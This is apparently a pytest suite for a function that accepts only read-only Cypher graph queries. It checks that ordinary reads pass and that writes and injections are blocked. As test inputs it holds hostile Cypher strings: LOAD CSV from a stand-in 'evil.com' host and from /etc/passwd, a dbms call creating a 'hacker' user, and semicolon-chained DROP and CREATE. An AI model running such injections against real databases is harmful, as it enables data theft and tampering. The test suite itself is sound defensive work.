"""Tests for Cypher read-only validation.

Covers: keyword blocking, semicolon injection, CALL/LOAD CSV/FOREACH,
and ensures legitimate read queries pass through.
"""

import pytest

from graph.read_queries import validate_cypher_readonly


# ── LEGITIMATE READ QUERIES (must PASS) ──


class TestCypherReadonlyAllowsReads:
    def test_simple_match_return(self):
        assert validate_cypher_readonly("MATCH (n) RETURN n") is True

    def test_match_with_where(self):
        assert validate_cypher_readonly(
            "MATCH (e:Entity) WHERE e.name = 'NATO' RETURN e"
        ) is True

    def test_match_with_order_limit(self):
        assert validate_cypher_readonly(
            "MATCH (ev:Event) RETURN ev ORDER BY ev.timestamp DESC LIMIT 10"
        ) is True

    def test_match_with_with_clause(self):
        assert validate_cypher_readonly(
            "MATCH (e:Entity)<-[:INVOLVES]-(ev:Event) "
            "WITH e, count(ev) AS cnt RETURN e.name, cnt"
        ) is True

    def test_shortest_path(self):
        assert validate_cypher_readonly(
            "MATCH path = shortestPath((a:Entity {name: 'X'})-[*..4]-(b:Entity {name: 'Y'})) RETURN path"
        ) is True

    def test_aggregation_functions(self):
        assert validate_cypher_readonly(
            "MATCH (e:Event) RETURN e.codebook_type, count(*) AS cnt, avg(e.confidence) AS avg_conf"
        ) is True

    def test_unwind(self):
        assert validate_cypher_readonly(
            "UNWIND ['a','b','c'] AS x MATCH (n {name: x}) RETURN n"
        ) is True

    def test_case_expression(self):
        assert validate_cypher_readonly(
            "MATCH (e:Event) RETURN CASE WHEN e.severity = 'critical' THEN 'HIGH' ELSE 'LOW' END"
        ) is True


# ── BASIC WRITE KEYWORDS (must REJECT) ──


class TestCypherReadonlyBlocksBasicWrites:
    def test_create(self):
        assert validate_cypher_readonly("CREATE (n:Entity {name: 'test'})") is False

    def test_merge(self):
        assert validate_cypher_readonly("MERGE (n:Entity {name: 'test'})") is False

    def test_delete(self):
        assert validate_cypher_readonly("MATCH (n) DELETE n") is False

    def test_detach_delete(self):
        assert validate_cypher_readonly("MATCH (n) DETACH DELETE n") is False

    def test_set_property(self):
        assert validate_cypher_readonly("MATCH (n) SET n.name = 'hacked'") is False

    def test_remove_property(self):
        assert validate_cypher_readonly("MATCH (n) REMOVE n.name") is False

    def test_drop_constraint(self):
        assert validate_cypher_readonly("DROP CONSTRAINT my_constraint") is False

    def test_drop_index(self):
        assert validate_cypher_readonly("DROP INDEX my_index") is False


# ── CASE INSENSITIVITY (must REJECT regardless of casing) ──


class TestCypherReadonlyCaseInsensitive:
    def test_lowercase_create(self):
        assert validate_cypher_readonly("create (n:Node)") is False

    def test_mixed_case_merge(self):
        assert validate_cypher_readonly("MeRgE (n:Node {id: 1})") is False

    def test_uppercase_delete(self):
        assert validate_cypher_readonly("MATCH (n) DELETE n") is False

    def test_lowercase_set(self):
        assert validate_cypher_readonly("MATCH (n) set n.x = 1") is False


# ── ADVANCED INJECTION VECTORS (must REJECT) ──


class TestCypherReadonlyBlocksInjections:
    def test_call_apoc_procedure(self):
        """CALL apoc.* can execute arbitrary side-effects."""
        assert validate_cypher_readonly("CALL apoc.do.when(true, 'CREATE (n)', '')") is False

    def test_call_dbms(self):
        """CALL dbms.* can change system config."""
        assert validate_cypher_readonly("CALL dbms.security.createUser('hacker', 'pw', false)") is False

    def test_call_without_braces(self):
        """CALL without { } should still be blocked."""
        assert validate_cypher_readonly("CALL db.labels()") is False

    def test_load_csv(self):
        """LOAD CSV can exfiltrate data or cause SSRF."""
        assert validate_cypher_readonly(
            "LOAD CSV FROM 'http://evil.com/data.csv' AS row CREATE (n {data: row})"
        ) is False

    def test_load_csv_with_headers(self):
        assert validate_cypher_readonly(
            "LOAD CSV WITH HEADERS FROM 'file:///etc/passwd' AS row RETURN row"
        ) is False

    def test_foreach(self):
        """FOREACH can execute write operations in a loop."""
        assert validate_cypher_readonly(
            "MATCH (n) FOREACH (x IN [1,2,3] | SET n.val = x)"
        ) is False

    def test_semicolon_multi_statement(self):
        """Semicolons enable multi-statement injection."""
        assert validate_cypher_readonly(
            "MATCH (n) RETURN n; DROP CONSTRAINT my_constraint"
        ) is False

    def test_semicolon_with_create(self):
        assert validate_cypher_readonly(
            "MATCH (n) RETURN n; CREATE (m:Malicious)"
        ) is False

    def test_semicolon_only_read(self):
        """Even two read statements separated by ; should be blocked."""
        assert validate_cypher_readonly(
            "MATCH (n) RETURN n; MATCH (m) RETURN m"
        ) is False

    def test_create_hidden_after_comment(self):
        """Write keyword after line comment should still be caught."""
        assert validate_cypher_readonly(
            "MATCH (n) RETURN n\n// innocent\nCREATE (m:Evil)"
        ) is False

    def test_set_in_match_context(self):
        """SET alone (not inside CASE/string) is a write operation."""
        assert validate_cypher_readonly(
            "MATCH (n:Entity {name: 'test'}) SET n.compromised = true"
        ) is False


# ── FALSE POSITIVE PREVENTION (must PASS — keywords inside strings/contexts) ──


class TestCypherReadonlyNoFalsePositives:
    def test_create_in_string_value(self):
        """The word CREATE inside a string literal is not a write operation."""
        assert validate_cypher_readonly(
            "MATCH (e:Event) WHERE e.title CONTAINS 'CREATE' RETURN e"
        ) is True

    def test_set_in_string_value(self):
        assert validate_cypher_readonly(
            "MATCH (e:Event) WHERE e.summary CONTAINS 'data set' RETURN e"
        ) is True

    def test_delete_in_string_value(self):
        assert validate_cypher_readonly(
            "MATCH (e:Event) WHERE e.title = 'DELETE old records' RETURN e"
        ) is True

    def test_call_in_string_value(self):
        assert validate_cypher_readonly(
            "MATCH (e:Event) WHERE e.title CONTAINS 'CALL to action' RETURN e"
        ) is True

    def test_merge_in_string_value(self):
        assert validate_cypher_readonly(
            "MATCH (e:Event) WHERE e.title = 'Company MERGE announced' RETURN e"
        ) is True
